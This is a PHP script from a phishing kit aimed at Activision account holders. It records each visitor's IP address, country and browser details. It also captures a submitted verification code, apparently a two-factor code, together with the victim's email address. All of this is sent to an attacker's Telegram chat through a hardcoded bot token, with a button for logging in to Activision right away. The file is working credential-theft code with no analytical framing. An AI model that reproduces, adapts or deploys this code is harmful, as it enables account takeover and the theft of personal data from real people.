<?php
session_start();
function getUserIp() {
    if (isset($_SERVER['HTTP_CF_CONNECTING_IP'])) {
        $ip = $_SERVER['HTTP_CF_CONNECTING_IP'];
    } elseif (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ipList = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        $ip = trim($ipList[0]);
    } else {
        $ip = $_SERVER['REMOTE_ADDR'];
    }
    $ipDetails = @json_decode(file_get_contents("http://ipinfo.io/{$ip}/json"));
    $country = $ipDetails->country ?? 'Unknown';
    return [$ip, $country];
}
function escapeMarkdownV2($text) {
    $text = str_replace(['\\', '_', '*', '[', ']', '(', ')', '~', '`', '>', '#', '+', '-', '=', '|', '{', '}', '.', '!'],
                        ['\\\\', '\_', '\*', '\[', '\]', '\(', '\)', '\~', '\`', '\>', '\#', '\+', '\-', '\=', '\|', '\{', '\}', '\.', '\!'], $text);
    return $text;
}
$botToken = '8356818555:AAFMC6VDrvxGYyTwG6e48Va97FoRspDXS8w'; // Renew if 401
$chatId = '-1003337812609';
$telegramApiUrl = "https://api.telegram.org/bot$botToken/sendMessage";
function sendToTelegram($token, $chatId, $text, $keyboard = null) {
    $url = "https://api.telegram.org/bot$token/sendMessage";
    $data = [
        'chat_id' => $chatId,
        'text' => $text,
        'parse_mode' => 'MarkdownV2'
    ];
    if ($keyboard) $data['reply_markup'] = json_encode($keyboard);
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    $result = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $error = curl_error($ch);
    curl_close($ch);
    $log = "HTTP: $httpCode | Error: $error | Result: $result\n";
    file_put_contents('telegram_log.txt', $log, FILE_APPEND);
    return $result;
}
list($userIp, $userCountry) = getUserIp();
$userIp = escapeMarkdownV2($userIp);
$userCountry = escapeMarkdownV2($userCountry);
$userAgent = escapeMarkdownV2($_SERVER['HTTP_USER_AGENT']);
$timestamp = date('Y-m-d H:i:s', strtotime('+4 hours'));
$visitMessage = "STEPGETCODE VISIT\n\nIP: `$userIp`\nCountry: `$userCountry`\nUser Agent: `$userAgent`\nTimestamp: `$timestamp`\n\nCoded By 'kiya'";
$visitResult = sendToTelegram($botToken, $chatId, $visitMessage);
if ($_SERVER['REQUEST_METHOD'] === 'POST' && !empty($_POST['code'])) {
    $code = escapeMarkdownV2($_POST['code']);
    $username = isset($_SESSION['username']) ? escapeMarkdownV2($_SESSION['username']) : 'Unknown';
    $message = "NEW CODE SUBMITTED\n\nEmail: `$username`\nCode: `$code`\n\nIP: `$userIp`\nCountry: `$userCountry`\nUser Agent: `$userAgent`\nTimestamp: `$timestamp`\n\nCoded By 'kiya'";
    $inlineKeyboard = [
        'inline_keyboard' => [
            [
                ['text' => 'Login to Activision', 'url' => 'https://s.activision.com/activision/login']
            ]
        ]
    ];
    $codeResult = sendToTelegram($botToken, $chatId, $message, $inlineKeyboard);
    if (strpos($codeResult, '"ok":true') === false) {
        // Fallback without keyboard
        sendToTelegram($botToken, $chatId, $message);
    }
    header('Location: success.html');
    exit();
}
file_put_contents('telegram_log.txt', "Invalid request: " . json_encode($_POST) . "\n", FILE_APPEND);
die('Error: Please enter the code.');
?>